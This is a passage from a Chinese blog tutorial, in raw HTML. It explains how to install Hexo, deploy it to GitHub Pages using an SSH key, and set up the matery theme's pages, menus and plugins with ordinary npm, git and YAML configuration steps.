title="1.安装到本地"></a>1.安装到本地</h4><p>  首先选择一个磁盘作为你博客文件的存放位置，然后新建一个文件夹，比如名为blogtest的文件夹，创建完后，先不要点进去，在此处点击鼠标右键，选择Git Bash Here，然后依次输入如下命令，：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo框架的安装 npm install -g hexo-cli # 等上一个命令完成后，在输入下面的命令 hexo init &lt;新建文件夹的名称&gt; #初始化文件夹 cd &lt;新建文件夹的名称&gt; npm install # 安装博客所需要的依赖文件</span></span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/38.jpg" alt="38"></p><p><strong>38</strong></p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/39.jpg" alt="39"></p><p><strong>39</strong></p><p>  等待运行完成，此时文件夹中多了许多文件。<br>  注意：后续的命令均需要在站点目录下（即文件夹内）使用Git Bash运行。<br>  此时Hexo框架的本地搭建已经完成了。我们来运行一下看看，命令行依次输入以下命令 :</p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/40.jpg" alt="40"></p><p><strong>40</strong></p><p>  浏览器中打开<a href="http://localhost:4000/">http://localhost:4000/</a>，可以看到一个网页，说明Hexo博客已经成功在本地运行。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/41.jpg" alt="41"></p><p><strong>41</strong></p><h4 id="2-本地博客发布到Github-Pages"><a href="#2-本地博客发布到Github-Pages" class="headerlink" title="2. 本地博客发布到Github Pages"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2%E5%8F%91%E5%B8%83%E5%88%B0Github-Pages" title="2. 本地博客发布到Github Pages"></a>2. 本地博客发布到Github Pages</h4><p>  之前的步骤中，我们已经完成了对Github账户的注册以及Github Pages的创建，接下来是将本地博客发布至Github Pages。</p><p>2.1 首先需要安装发布的插件，在站点目录下执行下面的命令，也就是创建的博客目录下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>  紧接着，将本地目录与GitHub关联起来，输入下面的命令行：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱地址&quot;</span></span><br></pre></td></tr></table></figure><p>  输入后一直回车，然后在C:&#x2F;Users&#x2F;[username]目录下找到名为.ssh的文件夹， 文件夹内会有两个文件，一个id_rsa.pub一个id_rsa，用文本编辑器打开id_rsa.pub，复制里面的的内容。 然后打开Github，点击右上角的头像 Settings 选择SSH and GPG keys  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/42.jpg" alt="42"></p><p><strong>42</strong></p><p>  点击New SSH key 将之前复制的内容粘帖到Key的框中。 上面的Title可以随意，点击Add SSH key 完成添加。  </p><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/43.jpg" alt="43"></p><p><strong>43</strong></p><p>2.2 然后回到Git的命令行界面，测试一下是否与GitHub连接成功。输入下面的命令行：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>  点击回车，然后会出现一个询问内容，输入yes，回车，会出现一段内容，Hi ! You’ve successfully authenticated, but GitHub doesnot provide shell access.。 说明连接成功。此处这个应该是你Github的用户名。</p><p>2.3 进入博客站点目录，用文本编辑器打开_config.yml，这个_config.yml是博客的配置文件，在以后的博客修改，如个性化修改，博客SEO优化等都会使用到，  修改如下图的几个地方：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title: 你的博客名 subtitle: 博客的副标题，有些主题支持 description: 博客描述 keywords: 博客关键词 author: 作者，在文章中显示 language: 博客语言语种 timezone: 时区</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/44.jpg" alt="44"></p><p><strong>44</strong></p><p>  滑到文件最底部，有一个deploy，在deploy下面添加一个repo项 ，一个branch项。填入如下代码，并如下图所示：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: git repo: git@github.com:Github用户名/github用户名.github.io.git //也可使用https地址，如：https://github.com/Github用户名/Github用户名.github.io.git branch: master</span><br></pre></td></tr></table></figure><p><img src= "" data-lazy-src="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/45.jpg" alt="45"></p><p><strong>45</strong></p><p>2.4 最后就是生成页面，并发布至Github Pages，执行如下命令：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Hexo会根据配置文件渲染出一套静态页面 hexo g # 将上一步渲染出的一系列文件上传至至Github Pages hexo d # 也可以直接输入此命令，直接完成渲染和上传 hexo g -d</span></span><br></pre></td></tr></table></figure><p>  上传完成后，在浏览器中打开https:&#x2F;&#x2F;&lt;用户名&gt;.github.io，查看上传的网页。如果页面变成了之前本地调试时的样子，说明上传以及完成了。没变的话查看一下上传时命令行窗口的信息有没有错误信息，没有的话清除一下浏览器缓存试试。</p><h3 id="五、hexo博客主题安装与修改"><a href="#五、hexo博客主题安装与修改" class="headerlink" title="五、hexo博客主题安装与修改"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#%E4%BA%94%E3%80%81hexo%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BF%AE%E6%94%B9" title="五、hexo博客主题安装与修改"></a>五、hexo博客主题安装与修改</h3><p>QQ 交流群(及文件下载):478404205</p><h4 id="1-主题下载与安装"><a href="#1-主题下载与安装" class="headerlink" title="1. 主题下载与安装"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#1-%E4%B8%BB%E9%A2%98%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85" title="1. 主题下载与安装"></a>1. 主题下载与安装</h4><p>  点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">网站</a> 下载 master 分支的最新稳定版的代码，解压缩后，将 hexo-theme-matery 的文件夹复制到你 Hexo 的 themes 文件夹中即可。</p><p>  当然你也可以在你的站点目录文件夹下使用 git clone 命令来下载：直接在站点根目录下执行下面的命令，即可进行主题的下载，主题有两个版本，稳定版本和最新版本(不定期更新优化)，自主选择版本。</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/blinkfox/hexo-theme-matery themes/matery <span class="comment"># 稳定版 git clone -b develop https://github.com/blinkfox/hexo-theme-matery themes/matery #最新版(不定期进行优化更新)</span></span><br></pre></td></tr></table></figure><h4 id="2-主题配置"><a href="#2-主题配置" class="headerlink" title="2. 主题配置"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE" title="2. 主题配置"></a>2. 主题配置</h4><h5 id="2-1-切换主题"><a href="#2-1-切换主题" class="headerlink" title="2.1 切换主题"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-1-%E5%88%87%E6%8D%A2%E4%B8%BB%E9%A2%98" title="2.1 切换主题"></a>2.1 切换主题</h5><p>  <strong>注意：</strong>首先需要明白什么是站点配置文件，什么是主题配置文件，站点配置文件就是根目录下的配置文件，比如我的博客文件在F:\blog下，那么站点配置文件就是F:\blog_config.yml，主题配置文件就是F:\blog\themes\matery_config.yml。</p><p>  另外注意，配置文件中的标点符号不要出现中文格式的标点符号，不然运行会出错。</p><p>  主题下载完成后，将站点配置文件中的theme值修改为你下载主题的文件名，此处为matery，那么值就修改为theme: matery。</p><p>  一些站点配置文件的其他地方的修改：</p><p>  语言选择：如果为中文用户，则在language:后添加值zh-CN，如果不修改，默认为英语；<br>  网址修改：url:的值为你的网址名，如<a href="http://xxxx.github.io,如果有域名,则修改为你的域名即可,至于有关域名的修改解析,后面我会说到,这里先不说了./">http://xxxx.github.io，如果有域名，则修改为你的域名即可，至于有关域名的修改解析，后面我会说到，这里先不说了。</a><br>  站点配置文件有个per_page属性，建议修改为6的倍数，这样网站在适应设备时，有较好的显示效果。</p><h5 id="2-2-新建标签-tags-页面"><a href="#2-2-新建标签-tags-页面" class="headerlink" title="2.2 新建标签 tags 页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-2-%E6%96%B0%E5%BB%BA%E6%A0%87%E7%AD%BE-tags-%E9%A1%B5%E9%9D%A2" title="2.2 新建标签 tags 页面"></a>2.2 新建标签 tags 页面</h5><p>tags 页是用来展示所有标签的页面，如果在你的博客 source 目录下还没有 tags&#x2F;index.md 文件，那么你就需要新建一个，命令如下：</p><p>  编辑你刚刚新建的页面文件 &#x2F;source&#x2F;tags&#x2F;index.md，至少需要以下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: tags <span class="built_in">date</span>: 2018-09-30 18:23:38 <span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span> layout: <span class="string">&quot;tags&quot;</span> ---</span><br></pre></td></tr></table></figure><h5 id="2-3-新建分类-categories-页面"><a href="#2-3-新建分类-categories-页面" class="headerlink" title="2.3 新建分类 categories 页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-3-%E6%96%B0%E5%BB%BA%E5%88%86%E7%B1%BB-categories-%E9%A1%B5%E9%9D%A2" title="2.3 新建分类 categories 页面"></a>2.3 新建分类 categories 页面</h5><p>  categories 页是用来展示所有分类的页面，如果在你的博客 source 目录下还没有 categories&#x2F;index.md 文件，那么你就需要新建一个，命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure><p>  编辑你刚刚新建的页面文件 &#x2F;source&#x2F;categories&#x2F;index.md，至少需要以下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: categories <span class="built_in">date</span>: 2018-09-30 17:25:30 <span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span> layout: <span class="string">&quot;categories&quot;</span> ---</span><br></pre></td></tr></table></figure><h5 id="2-4-新建关于我-about-页面"><a href="#2-4-新建关于我-about-页面" class="headerlink" title="2.4 新建关于我 about 页面"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-4-%E6%96%B0%E5%BB%BA%E5%85%B3%E4%BA%8E%E6%88%91-about-%E9%A1%B5%E9%9D%A2" title="2.4 新建关于我 about 页面"></a>2.4 新建关于我 about 页面</h5><p>  about 页是用来展示关于我和我的博客信息的页面，如果在你的博客 source 目录下还没有 about&#x2F;index.md 文件，那么你就需要新建一个，命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br></pre></td></tr></table></figure><p>  编辑你刚刚新建的页面文件 &#x2F;source&#x2F;about&#x2F;index.md，至少需要以下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: about <span class="built_in">date</span>: 2018-09-30 17:25:30 <span class="built_in">type</span>: <span class="string">&quot;about&quot;</span> layout: <span class="string">&quot;about&quot;</span> ---</span><br></pre></td></tr></table></figure><h5 id="2-5-新建留言板-contact-页面-可选"><a href="#2-5-新建留言板-contact-页面-可选" class="headerlink" title="2.5 新建留言板 contact 页面 (可选)"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-5-%E6%96%B0%E5%BB%BA%E7%95%99%E8%A8%80%E6%9D%BF-contact-%E9%A1%B5%E9%9D%A2-%E5%8F%AF%E9%80%89" title="2.5 新建留言板 contact 页面 (可选)"></a>2.5 新建留言板 contact 页面 (可选)</h5><p>  contact 页是用来展示留言板信息的页面，如果在你的博客 source 目录下还没有 contact&#x2F;index.md 文件，那么你就需要新建一个，命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;contact&quot;</span></span><br></pre></td></tr></table></figure><p>  编辑你刚刚新建的页面文件 &#x2F;source&#x2F;contact&#x2F;index.md，至少需要以下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: contact <span class="built_in">date</span>: 2018-09-30 17:25:30 <span class="built_in">type</span>: <span class="string">&quot;contact&quot;</span> layout: <span class="string">&quot;contact&quot;</span> ---</span><br></pre></td></tr></table></figure><p>  注：本留言板功能依赖于第三方评论系统，请激活你的评论系统才有效果。并且在主题的 _config.yml 文件中，第 19 至 21 行的“菜单”配置，取消关于留言板的注释即可。</p><h5 id="2-6-新建友情链接-friends-页面-可选"><a href="#2-6-新建友情链接-friends-页面-可选" class="headerlink" title="2.6 新建友情链接 friends 页面 (可选)"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-6-%E6%96%B0%E5%BB%BA%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5-friends-%E9%A1%B5%E9%9D%A2-%E5%8F%AF%E9%80%89" title="2.6 新建友情链接 friends 页面 (可选)"></a>2.6 新建友情链接 friends 页面 (可选)</h5><p>friends 页是用来展示友情链接信息的页面，如果在你的博客 source 目录下还没有 friends&#x2F;index.md 文件，那么你就需要新建一个，命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;friends&quot;</span></span><br></pre></td></tr></table></figure><p>  编辑你刚刚新建的页面文件 &#x2F;source&#x2F;friends&#x2F;index.md，至少需要以下内容：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--- title: friends <span class="built_in">date</span>: 2018-12-12 21:25:30 <span class="built_in">type</span>: <span class="string">&quot;friends&quot;</span> layout: <span class="string">&quot;friends&quot;</span> ---</span><br></pre></td></tr></table></figure><p>  同时，在你的博客 source 目录下新建 _data 目录，在 _data 目录中新建 friends.json 文件，文件内容如下所示：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123; <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/1_qq_27922023.jpg&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;码酱&quot;</span>, <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;我不是大佬，只是在追寻大佬的脚步&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://luokangyuan.com/&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;前去学习&quot;</span> &#125;, &#123; <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/4027734.jpeg&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;闪烁之狐&quot;</span>, <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://blinkfox.github.io/&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;前去学习&quot;</span> &#125;, &#123; <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;http://image.luokangyuan.com/avatar.jpg&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;ja_rome&quot;</span>, <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;平凡的脚步也可以走出伟大的行程&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://me.csdn.net/jlh912008548&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;前去学习&quot;</span> &#125;]</span><br></pre></td></tr></table></figure><h5 id="2-7-菜单导航配置"><a href="#2-7-菜单导航配置" class="headerlink" title="2.7 菜单导航配置"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-7-%E8%8F%9C%E5%8D%95%E5%AF%BC%E8%88%AA%E9%85%8D%E7%BD%AE" title="2.7 菜单导航配置"></a>2.7 菜单导航配置</h5><h6 id="2-7-1-配置基本菜单导航的名称、路径url和图标icon"><a href="#2-7-1-配置基本菜单导航的名称、路径url和图标icon" class="headerlink" title="2.7.1 配置基本菜单导航的名称、路径url和图标icon."></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-7-1-%E9%85%8D%E7%BD%AE%E5%9F%BA%E6%9C%AC%E8%8F%9C%E5%8D%95%E5%AF%BC%E8%88%AA%E7%9A%84%E5%90%8D%E7%A7%B0%E3%80%81%E8%B7%AF%E5%BE%84url%E5%92%8C%E5%9B%BE%E6%A0%87icon" title="2.7.1 配置基本菜单导航的名称、路径url和图标icon."></a>2.7.1 配置基本菜单导航的名称、路径url和图标icon.</h6><p>1.菜单导航名称可以是中文也可以是英文(如：Index或主页)<br>2.图标icon 可以在Font Awesome 中查找</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu: Index: url: / icon: fas fa-home Tags: url: /tags icon: fas fa-tags Categories: url: /categories icon: fas fa-bookmark Archives: url: /archives icon: fas fa-archive About: url: /about icon: fas fa-user-circle Friends: url: /friends icon: fas fa-address-book</span><br></pre></td></tr></table></figure><h6 id="2-7-2-二级菜单配置方法"><a href="#2-7-2-二级菜单配置方法" class="headerlink" title="2.7.2. 二级菜单配置方法"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-7-2-%E4%BA%8C%E7%BA%A7%E8%8F%9C%E5%8D%95%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95" title="2.7.2. 二级菜单配置方法"></a>2.7.2. 二级菜单配置方法</h6><p>  如果你需要二级菜单则可以在原基本菜单导航的基础上如下操作</p><p>1.在需要添加二级菜单的一级菜单下添加children关键字(如:About菜单下添加children)<br>2.在children下创建二级菜单的 名称name,路径url和图标icon.<br>3.注意每个二级菜单模块前要加 -.<br>4.注意缩进格式</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">menu: Index: url: / icon: fas fa-home Tags: url: /tags icon: fas fa-tags Categories: url: /categories icon: fas fa-bookmark Archives: url: /archives icon: fas fa-archive About: url: /about icon: fas fa-user-circle-o Friends: url: /friends icon: fas fa-address-book Medias: icon: fas fa-list children: - name: Musics url: /musics icon: fas fa-music - name: Movies url: /movies icon: fas fa-film - name: Books url: /books icon: fas fa-book - name: Galleries url: /galleries icon: fas fa-image</span><br></pre></td></tr></table></figure><h5 id="2-8-添加emoji表情支持（可选的）"><a href="#2-8-添加emoji表情支持（可选的）" class="headerlink" title="2.8 添加emoji表情支持（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-8-%E6%B7%BB%E5%8A%A0emoji%E8%A1%A8%E6%83%85%E6%94%AF%E6%8C%81%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.8 添加emoji表情支持（可选的）"></a>2.8 添加emoji表情支持（可选的）</h5><p>  本主题新增了对emoji表情的支持，使用到了 hexo-filter-github-emojis 的 Hexo 插件来支持 emoji表情的生成，把对应的markdown emoji语法（::,例如：:smile:）转变成会跳跃的emoji表情，安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-filter-github-emojis --save</span><br></pre></td></tr></table></figure><p>  在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">githubEmojis: <span class="built_in">enable</span>: <span class="literal">true</span> className: github-emoji inject: <span class="literal">true</span> styles: customEmojis:</span><br></pre></td></tr></table></figure><p>  执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后就可以在文章中对应位置看到你用emoji语法写的表情了。</p><h5 id="2-9-代码高亮"><a href="#2-9-代码高亮" class="headerlink" title="2.9 代码高亮"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-9-%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE" title="2.9 代码高亮"></a>2.9 代码高亮</h5><p>  由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 hexo-prism-plugin 的 Hexo 插件来做代码高亮，安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -S hexo-prism-plugin</span><br></pre></td></tr></table></figure><p>  然后，修改 Hexo 根目录下 _config.yml 文件中 highlight.enable 的值为 false，并新增 prism 插件相关的配置，主要配置如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prism_plugin: mode: <span class="string">&#x27;preprocess&#x27;</span> <span class="comment"># realtime/preprocess theme: &#x27;tomorrow&#x27; line_number: false # default false custom_css:</span></span><br></pre></td></tr></table></figure><h5 id="2-10-搜索"><a href="#2-10-搜索" class="headerlink" title="2.10 搜索"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-10-%E6%90%9C%E7%B4%A2" title="2.10 搜索"></a>2.10 搜索</h5><p>  本主题中还使用到了 hexo-generator-search 的 Hexo 插件来做内容搜索，安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>  在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search: path: search.xml field: post</span><br></pre></td></tr></table></figure><h5 id="2-11-中文链接转拼音（可选的）"><a href="#2-11-中文链接转拼音（可选的）" class="headerlink" title="2.11 中文链接转拼音（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-11-%E4%B8%AD%E6%96%87%E9%93%BE%E6%8E%A5%E8%BD%AC%E6%8B%BC%E9%9F%B3%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.11 中文链接转拼音（可选的）"></a>2.11 中文链接转拼音（可选的）</h5><p>  如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 SEO，且 gitment 评论对中文链接也不支持。我们可以用   hexo-permalink-pinyin Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>  安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i hexo-permalink-pinyin --save</span><br></pre></td></tr></table></figure><p>  在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permalink_pinyin: <span class="built_in">enable</span>: <span class="literal">true</span> separator: <span class="string">&#x27;-&#x27;</span> <span class="comment"># default: &#x27;-&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>注：</strong>除了此插件外，hexo-abbrlink 插件也可以生成非中文的链接。</p><h5 id="2-12-文章字数统计插件（可选的）"><a href="#2-12-文章字数统计插件（可选的）" class="headerlink" title="2.12 文章字数统计插件（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-12-%E6%96%87%E7%AB%A0%E5%AD%97%E6%95%B0%E7%BB%9F%E8%AE%A1%E6%8F%92%E4%BB%B6%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.12 文章字数统计插件（可选的）"></a>2.12 文章字数统计插件（可选的）</h5><p>  如果你想要在文章中显示文章字数、阅读时长信息，可以安装 hexo-wordcount插件。</p><p>  安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save hexo-wordcount</span><br></pre></td></tr></table></figure><p>  然后只需在本主题下的 _config.yml 文件中，激活以下配置项即可：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wordCount: <span class="built_in">enable</span>: <span class="literal">false</span> <span class="comment"># 将这个值设置为 true 即可. postWordCount: true min2read: true totalCount: true</span></span><br></pre></td></tr></table></figure><p>  本主题中还使用到了 hexo-generator-feed 的 Hexo 插件来做 RSS，安装命令如下：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure><p>  在 Hexo 根目录下的 _config.yml 文件中，新增以下的配置项：</p><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feed: <span class="built_in">type</span>: atom path: atom.xml <span class="built_in">limit</span>: 20 hub: content: content_limit: 140 content_limit_delim: <span class="string">&#x27; &#x27;</span> order_by: -<span class="built_in">date</span></span><br></pre></td></tr></table></figure><p>  执行 hexo clean &amp;&amp; hexo g 重新生成博客文件，然后在 public 文件夹中即可看到 atom.xml 文件，说明你已经安装成功了。</p><h5 id="2-14-添加-DaoVoice-在线聊天功能（可选的）"><a href="#2-14-添加-DaoVoice-在线聊天功能（可选的）" class="headerlink" title="2.14 添加 DaoVoice 在线聊天功能（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-14-%E6%B7%BB%E5%8A%A0-DaoVoice-%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%8A%9F%E8%83%BD%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.14 添加 DaoVoice 在线聊天功能（可选的）"></a>2.14 添加 DaoVoice 在线聊天功能（可选的）</h5><p>  前往 <a href="https://www.daocloud.io/">DaoVoice</a>官网注册并且获取 app_id，并将 app_id 填入主题的 _config.yml 文件中</p><h5 id="2-15-添加-Tidio-在线聊天功能（可选的）"><a href="#2-15-添加-Tidio-在线聊天功能（可选的）" class="headerlink" title="2.15 添加 Tidio 在线聊天功能（可选的）"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-15-%E6%B7%BB%E5%8A%A0-Tidio-%E5%9C%A8%E7%BA%BF%E8%81%8A%E5%A4%A9%E5%8A%9F%E8%83%BD%EF%BC%88%E5%8F%AF%E9%80%89%E7%9A%84%EF%BC%89" title="2.15 添加 Tidio 在线聊天功能（可选的）"></a>2.15 添加 Tidio 在线聊天功能（可选的）</h5><p>  前往 <a href="https://www.tidio.com/">Tidio</a>官网注册并且获取 Public Key，并将 Public Key 填入主题的 _config.yml 文件中。</p><h5 id="2-16-修改页脚"><a href="#2-16-修改页脚" class="headerlink" title="2.16 修改页脚"></a><a href="https://crazyyuchi.github.io/2022/05/02/bo-ke-da-jian-mei-hua-ju-xi-ban-ben/#2-16-%E4%BF%AE%E6%94%B9%E9%A1%B5%E8%84%9A" title="2.16 修改页脚"></a>2.16 修改页脚</h5><p>  页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 